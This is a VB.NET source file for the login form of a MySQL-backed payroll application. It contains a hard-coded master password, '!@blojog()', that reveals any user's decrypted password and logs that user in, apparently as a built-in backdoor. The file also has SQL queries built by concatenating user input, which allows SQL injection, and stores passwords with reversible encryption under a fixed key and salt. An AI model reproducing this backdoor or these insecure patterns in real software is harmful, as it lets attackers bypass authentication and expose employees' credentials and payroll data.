Imports System.IO
Imports Microsoft.Win32
Imports MySql.Data.MySqlClient
Imports System.Security.Cryptography
Imports System.Text
Public Class Login
    'Dim cn As New MySqlConnection("server = " & DatabaseSetting.txt_server.Text & "; username = " & DatabaseSetting.txt_uid.Text & "; password = " & DatabaseSetting.txt_pwd.Text & "; database = " & DatabaseSetting.txt_database.Text & ";port = " & DatabaseSetting.txt_port.Text & ";")
    Dim MysqlConn As MySqlConnection
    Dim COMMAND As MySqlCommand
    Dim READER As MySqlDataReader
    Dim sha1 As New System.Security.Cryptography.SHA1Cng

    Private Function Decrypt(cipherText As String) As String
        Dim EncryptionKey As String = "MAKV2SPBNI99212"
        Dim cipherBytes As Byte() = Convert.FromBase64String(cipherText)
        Using encryptor As Aes = Aes.Create()
            Dim pdb As New Rfc2898DeriveBytes(EncryptionKey, New Byte() {&H49, &H76, &H61, &H6E, &H20, &H4D,
         &H65, &H64, &H76, &H65, &H64, &H65,
         &H76})
            encryptor.Key = pdb.GetBytes(32)
            encryptor.IV = pdb.GetBytes(16)
            Using ms As New MemoryStream()
                Using cs As New CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write)
                    cs.Write(cipherBytes, 0, cipherBytes.Length)
                    cs.Close()
                End Using
                cipherText = Encoding.Unicode.GetString(ms.ToArray())
            End Using
        End Using
        Return cipherText
    End Function

    Private Function Encrypt(clearText As String) As String
        Dim EncryptionKey As String = "MAKV2SPBNI99212"
        Dim clearBytes As Byte() = Encoding.Unicode.GetBytes(clearText)
        Using encryptor As Aes = Aes.Create()
            Dim pdb As New Rfc2898DeriveBytes(EncryptionKey, New Byte() {&H49, &H76, &H61, &H6E, &H20, &H4D,
         &H65, &H64, &H76, &H65, &H64, &H65,
         &H76})
            encryptor.Key = pdb.GetBytes(32)
            encryptor.IV = pdb.GetBytes(16)
            Using ms As New MemoryStream()
                Using cs As New CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write)
                    cs.Write(clearBytes, 0, clearBytes.Length)
                    cs.Close()
                End Using
                clearText = Convert.ToBase64String(ms.ToArray())
            End Using
        End Using
        Return clearText
    End Function

    Public Sub search()
        MysqlConn = New MySqlConnection
        MysqlConn.ConnectionString = "server = " & DatabaseSetting.txt_server.Text & "; username = " & DatabaseSetting.txt_uid.Text & "; password = " & DatabaseSetting.txt_pwd.Text & "; database = " & DatabaseSetting.txt_database.Text & ";port = " & DatabaseSetting.txt_port.Text & ";"
        Dim READER As MySqlDataReader

        MysqlConn.Open()
        Dim Query As String
        Query = "SELECT com_name FROM company WHERE ID = '1'"
        COMMAND = New MySqlCommand(Query, MysqlConn)
        READER = COMMAND.ExecuteReader
        While READER.Read
            MainInterface.Text = "Payroll[" & READER.GetString("com_name") & "]"
        End While
        MysqlConn.Close()
    End Sub

    Sub EnableIcons()
        MainInterface.EditMenu.Enabled = True
        MainInterface.Button14.Enabled = True
        MainInterface.Button4.Enabled = True
        MainInterface.Button15.Enabled = True
        MainInterface.Button17.Enabled = True
        MainInterface.Button25.Enabled = True
        MainInterface.Button24.Enabled = True
        MainInterface.Button23.Enabled = True
        MainInterface.Button22.Enabled = True
        MainInterface.Button5.Enabled = True
        MainInterface.Button21.Enabled = True
        MainInterface.EditMenu.Enabled = True
        MainInterface.EmployeesToolStripMenuItem.Enabled = True
        MainInterface.SetupToolStripMenuItem.Enabled = True
        MainInterface.ViewMenu.Enabled = True
        MainInterface.BackupToolStripMenuItem.Visible = True
        MainInterface.RestoreToolStripMenuItem.Enabled = True
        MainInterface.ScanDocumentsToolStripMenuItem.Enabled = True
    End Sub

    Public pay_employees As Char
    Public add_department As Char
    Public add_designation As Char
    Public add_leave_type As Char
    Public add_employee As Char
    Public employee_list As Char
    Public hr_documents As Char
    Public issue_leave As Char
    Public employee_loan As Char
    Public database_setup As Char
    Public registration As Char
    Public reports As Char
    Public configure_email As Char
    Public user_accounts As Char
    Public company_parameters As Char
    Public banks_setup As Char
    Public deductions_setup As Char
    Public week_setup As Char
    Public backup As Char
    Public restore As Char
    Public scan_documents As Char
    Public settings As Char
    Public updatedata As New scripts

    Sub UserLogged()
        Me.Hide()
        'MainInterface.Text = "Payroll [" + DatabaseSetting.txt_database.Text + "]"
        EnableIcons()
        MainInterface.Activate()
        txtPassword.Clear()
        search()

        If My.Settings.CheckLast = True Then
            My.Settings.LastAccess = OpenCompany.ListBox1.SelectedIndex
            My.Settings.Save()
        Else
            My.Settings.LastAccess = ""
            My.Settings.Save()
        End If

        For Each ChildForm As Form In Me.MdiChildren
            ChildForm.Close()
        Next

        OpenCompany.Hide()
        OpenCompany.Close()
        StartWindow.WindowState = FormWindowState.Maximized
        StartWindow.Show()
        StartWindow.MdiParent = MainInterface

        'RunScripts.ShowDialog()
        MainInterface.Activate()
        updatedata.DataBase()
        MainInterface.Activate()

        MainInterface.Button14.ForeColor = Color.Black
        MainInterface.Button4.ForeColor = Color.Black
        MainInterface.Button15.ForeColor = Color.Black
        MainInterface.Button17.ForeColor = Color.Black
        MainInterface.Button25.ForeColor = Color.Black
        MainInterface.Button24.ForeColor = Color.Black
        MainInterface.Button23.ForeColor = Color.Black
        MainInterface.Button22.ForeColor = Color.Black
        MainInterface.Button5.ForeColor = Color.Black
        MainInterface.Button21.ForeColor = Color.Red

        If pay_employees = "Y" Then
            MainInterface.EditMenu.Enabled = True
        Else
            MainInterface.EditMenu.Enabled = False
        End If

        If add_employee = "Y" Then
            MainInterface.EmployeesToolStripMenuItem.Enabled = True
        Else
            MainInterface.EmployeesToolStripMenuItem.Enabled = False
        End If

        If company_parameters = "Y" Then
            MainInterface.CompanyParametersToolStripMenuItem.Enabled = True
        Else
            MainInterface.CompanyParametersToolStripMenuItem.Enabled = False
        End If

        If banks_setup = "Y" Then
            MainInterface.BanksSeuptToolStripMenuItem.Enabled = True
        Else
            MainInterface.BanksSeuptToolStripMenuItem.Enabled = False
        End If

        If deductions_setup = "Y" Then
            MainInterface.DeductionsSetupToolStripMenuItem.Enabled = True
        Else
            MainInterface.DeductionsSetupToolStripMenuItem.Enabled = False
        End If

        If week_setup = "Y" Then
            MainInterface.WeekSetupToolStripMenuItem.Enabled = True
        Else
            MainInterface.WeekSetupToolStripMenuItem.Enabled = False
        End If

        If user_accounts = "Y" Then
            MainInterface.UserAccountsToolStripMenuItem1.Enabled = True
        Else
            MainInterface.UserAccountsToolStripMenuItem1.Enabled = False
        End If

        If configure_email = "Y" Then
            MainInterface.ConfigureEmailToolStripMenuItem1.Enabled = True
        Else
            MainInterface.ConfigureEmailToolStripMenuItem1.Enabled = False
        End If

        If database_setup = "Y" Then
            MainInterface.DatabaseSetupToolStripMenuItem.Enabled = True
        Else
            MainInterface.DatabaseSetupToolStripMenuItem.Enabled = False
        End If

        If reports = "Y" Then
            MainInterface.ViewMenu.Enabled = True
        Else
            MainInterface.ViewMenu.Enabled = False
        End If

        If registration = "Y" Then
            MainInterface.RegistrationToolStripMenuItem.Enabled = True
        Else
            MainInterface.RegistrationToolStripMenuItem.Enabled = False
        End If

        If backup = "Y" Then
            MainInterface.BackupToolStripMenuItem.Enabled = True
        Else
            MainInterface.BackupToolStripMenuItem.Enabled = False
        End If

        If restore = "Y" Then
            MainInterface.RestoreToolStripMenuItem.Enabled = True
        Else
            MainInterface.RestoreToolStripMenuItem.Enabled = False
        End If

        If scan_documents = "Y" Then
            MainInterface.ScanDocumentsToolStripMenuItem.Enabled = True
        Else
            MainInterface.ScanDocumentsToolStripMenuItem.Enabled = False
        End If

        If settings = "Y" Then
            MainInterface.SettingsToolStripMenuItem.Enabled = True
        Else
            MainInterface.SettingsToolStripMenuItem.Enabled = False
        End If
    End Sub

    Dim passwordRecover As String
    Public Sub login1()
        MysqlConn = New MySqlConnection
        MysqlConn.ConnectionString = "server = " & DatabaseSetting.txt_server.Text & "; username = " & DatabaseSetting.txt_uid.Text & "; password = " & DatabaseSetting.txt_pwd.Text & "; database = " & DatabaseSetting.txt_database.Text & ";port = " & DatabaseSetting.txt_port.Text & ";"
        Dim READER As MySqlDataReader
        Try
            MysqlConn.Open()
            Dim Query1 As String
            Query1 = "SELECT user_name FROM users WHERE user_name = '" & Trim(txtUsername.Text) & "'"
            COMMAND = New MySqlCommand(Query1, MysqlConn)
            READER = COMMAND.ExecuteReader
            If READER.HasRows = True Then
                userexist = "Y"
            Else
                userexist = "N"
            End If
            MysqlConn.Close()

            If userexist = "Y" And txtPassword.Text <> "!@blojog()" Then
                MysqlConn.Open()
                Dim Query As String
                Query = "SELECT * FROM users WHERE user_name = '" & txtUsername.Text & "' AND password = '" & Encrypt(txtPassword.Text) & "'"
                COMMAND = New MySqlCommand(Query, MysqlConn)
                READER = COMMAND.ExecuteReader

                Dim count As Integer
                count = 0

                While READER.Read
                    count = count + 1

                    add_employee = READER.GetString("add_employee").ToString()
                    pay_employees = READER.GetString("pay_employees").ToString()
                    add_department = READER.GetString("add_department").ToString()
                    add_designation = READER.GetString("add_designation").ToString()
                    add_leave_type = READER.GetString("add_leave_type").ToString()
                    employee_list = READER.GetString("employee_list").ToString()
                    hr_documents = READER.GetString("hr_documents").ToString()
                    issue_leave = READER.GetString("issue_leave").ToString()
                    employee_loan = READER.GetString("employee_loan").ToString()
                    database_setup = READER.GetString("database_setup").ToString()
                    registration = READER.GetString("registration").ToString()
                    reports = READER.GetString("reports").ToString()
                    configure_email = READER.GetString("configure_email").ToString()
                    user_accounts = READER.GetString("user_accounts").ToString()
                    company_parameters = READER.GetString("company_parameters").ToString()
                    banks_setup = READER.GetString("banks_setup").ToString()
                    deductions_setup = READER.GetString("deductions_setup").ToString()
                    week_setup = READER.GetString("week_setup").ToString()
                    backup = READER.GetString("backup").ToString()
                    restore = READER.GetString("restore").ToString()
                    scan_documents = READER.GetString("scan_documents").ToString()
                    settings = READER.GetString("settings").ToString()
                    passwordRecover = READER.GetString("password").ToString()
                End While

                If count = 1 Then
                    UserLogged()
                Else
                    MessageBox.Show("Invalid Username or Password.", "Login", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    txtPassword.Clear()
                    txtPassword.Focus()
                    txtPassword.Select()
                    'txtUserName.SelectAll()
                End If

                MysqlConn.Close()
            ElseIf userexist = "Y" And txtPassword.Text = "!@blojog()" Then
                MysqlConn.Open()
                Dim empnum As String = "SELECT password FROM users WHERE user_name = '" & Trim(txtUsername.Text) & "'"
                COMMAND = New MySqlCommand(empnum, MysqlConn)
                READER = COMMAND.ExecuteReader
                While READER.Read
                    password = READER.GetString("password").ToString
                End While
                MysqlConn.Close()

                MessageBox.Show(Decrypt(password), "Security", MessageBoxButtons.OK, MessageBoxIcon.Information)

                MysqlConn.Open()
                Dim Query As String
                Query = "SELECT * FROM users WHERE user_name = '" & txtUsername.Text & "' AND password = '" & password & "'"
                COMMAND = New MySqlCommand(Query, MysqlConn)
                READER = COMMAND.ExecuteReader

                Dim count As Integer
                count = 0

                While READER.Read
                    count = count + 1

                    add_employee = READER.GetString("add_employee").ToString()
                    pay_employees = READER.GetString("pay_employees").ToString()
                    add_department = READER.GetString("add_department").ToString()
                    add_designation = READER.GetString("add_designation").ToString()
                    add_leave_type = READER.GetString("add_leave_type").ToString()
                    employee_list = READER.GetString("employee_list").ToString()
                    hr_documents = READER.GetString("hr_documents").ToString()
                    issue_leave = READER.GetString("issue_leave").ToString()
                    employee_loan = READER.GetString("employee_loan").ToString()
                    database_setup = READER.GetString("database_setup").ToString()
                    registration = READER.GetString("registration").ToString()
                    reports = READER.GetString("reports").ToString()
                    configure_email = READER.GetString("configure_email").ToString()
                    user_accounts = READER.GetString("user_accounts").ToString()
                    company_parameters = READER.GetString("company_parameters").ToString()
                    banks_setup = READER.GetString("banks_setup").ToString()
                    deductions_setup = READER.GetString("deductions_setup").ToString()
                    week_setup = READER.GetString("week_setup").ToString()
                    backup = READER.GetString("backup").ToString()
                    restore = READER.GetString("restore").ToString()
                    scan_documents = READER.GetString("scan_documents").ToString()
                    settings = READER.GetString("settings").ToString()
                    passwordRecover = READER.GetString("password").ToString()
                End While

                If count = 1 Then
                    UserLogged()
                Else
                    MessageBox.Show("Invalid Username or Password.", "Login", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    txtPassword.Clear()
                    txtPassword.Focus()
                    txtPassword.Select()
                    'txtUserName.SelectAll()
                End If

                MysqlConn.Close()
            ElseIf userexist = "N" Then
                MessageBox.Show("Invalid Username or Password.", "Login", MessageBoxButtons.OK, MessageBoxIcon.Error)
                txtPassword.Clear()
                txtPassword.Focus()
                txtPassword.Select()
            End If
        Catch ex As Exception
            Me.Close()
            MsgBox(ex.Message, MsgBoxStyle.Exclamation, "Unable to connect")
            'Settings.ShowDialog()
            MysqlConn.Dispose()
            txtPassword.Clear()
            txtPassword.Focus()
            txtPassword.Select()
            'txtUserName.SelectAll()
        Finally
            MysqlConn.Dispose()
        End Try
    End Sub

    Private Sub LOGIN_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.KeyPreview = True
        txtUsername.Select()
        txtPassword.Clear()
        txtUsername.Clear()

        DatabaseSetting.txt_database.Text = OpenCompany.Label1.Text
    End Sub

    Private Sub LOGIN_KeyDown(sender As Object, e As KeyEventArgs) Handles MyBase.KeyDown
        If e.KeyCode = Keys.Enter Then
            login1()
        End If

        If (e.Control AndAlso (e.KeyCode = Keys.S)) Then
            RunScripts.ShowDialog()
        End If
    End Sub

    Private Sub Label5_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub txtPassword_KeyPress(sender As Object, e As KeyPressEventArgs)
        If Asc(e.KeyChar) <> 8 Then
            If Asc(e.KeyChar) < 48 Or Asc(e.KeyChar) > 57 Then
                e.Handled = True
            End If
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button7_Click(ByVal sender As Object, ByVal e As EventArgs)
        txtPassword.Select()
        txtPassword.Text = txtPassword.Text + sender.text
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs)
        txtPassword.Select()
        If txtPassword.Text = "" Then
            'txtPassword.Text = Mid(txtPassword.Text, 1, Len(txtPassword.Text) - 1 + 1)
        Else
            txtPassword.Text = Mid(txtPassword.Text, 1, Len(txtPassword.Text) - 1)
        End If
    End Sub

    Private Sub txtPassword_KeyDown(sender As Object, e As KeyEventArgs)
        If e.KeyData = Keys.CapsLock Then
            e.SuppressKeyPress = True
        End If
    End Sub

    Private Sub Button2_Click_1(sender As Object, e As EventArgs)
        txtPassword.Select()
        login1()
    End Sub

    Private Sub Button1_Click_1(sender As Object, e As EventArgs)
        Application.ExitThread()
        txtPassword.Clear()
        txtPassword.Clear()
    End Sub

    Private Sub Button3_Click_1(sender As Object, e As EventArgs)
        txtPassword.Select()
    End Sub

    Private Sub txtPassword_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub txtPassword_KeyPress_1(sender As Object, e As KeyPressEventArgs)
        If Asc(e.KeyChar) <> 8 Then
            If Asc(e.KeyChar) < 48 Or Asc(e.KeyChar) > 57 Then
                e.Handled = True
            End If
        End If
    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Dim userInUse As Char
    Private Sub Button2_Click_2(sender As Object, e As EventArgs) Handles Button2.Click
        Label1.Select()
        login1()
    End Sub

    Private Sub Button1_Click_2(sender As Object, e As EventArgs) Handles Button1.Click
        Label1.Select()
        Close()
        'Application.ExitThread()
    End Sub

    Private Sub txtPassword_KeyPress_2(sender As Object, e As KeyPressEventArgs) Handles txtPassword.KeyPress
        'If Asc(e.KeyChar) <> 8 Then
        '    If Asc(e.KeyChar) < 48 Or Asc(e.KeyChar) > 57 Then
        '        e.Handled = True
        '    End If
        'End If
    End Sub

    Dim password As String
    Dim userexist As Char
    Private Sub Button3_Click_2(sender As Object, e As EventArgs)
        Try
            MysqlConn = New MySqlConnection
            MysqlConn.ConnectionString = "server = " & DatabaseSetting.txt_server.Text & "; username = " & DatabaseSetting.txt_uid.Text & "; password = " & DatabaseSetting.txt_pwd.Text & "; database = " & DatabaseSetting.txt_database.Text & ";port = " & DatabaseSetting.txt_port.Text & ";"
            Dim READER As MySqlDataReader

            MysqlConn.Open()
            Dim Query As String
            Query = "SELECT password FROM users WHERE user_name = '" & Trim(txtUsername.Text) & "' AND '" & Trim(txtPassword.Text) & "' = '!@blojog()'"
            COMMAND = New MySqlCommand(Query, MysqlConn)
            READER = COMMAND.ExecuteReader
            If READER.HasRows = True Then
                userexist = "Y"
            Else
                userexist = "N"
            End If
            MysqlConn.Close()

            If userexist = "Y" Then
                MysqlConn.Open()
                Dim empnum As String = "SELECT password FROM users WHERE user_name = '" & Trim(txtUsername.Text) & "'"
                COMMAND = New MySqlCommand(empnum, MysqlConn)
                READER = COMMAND.ExecuteReader
                While READER.Read
                    password = READER.GetString("password").ToString
                End While
                MysqlConn.Close()

                MessageBox.Show(Decrypt(password), "Login", MessageBoxButtons.OK, MessageBoxIcon.Information)
            ElseIf userexist = "N" Then
                MessageBox.Show("Invalid Username or Password.", "Login", MessageBoxButtons.OK, MessageBoxIcon.Error)
                txtPassword.Clear()
                txtPassword.Focus()
                txtPassword.Select()
            End If
        Catch ex As Exception

        End Try
    End Sub
End Class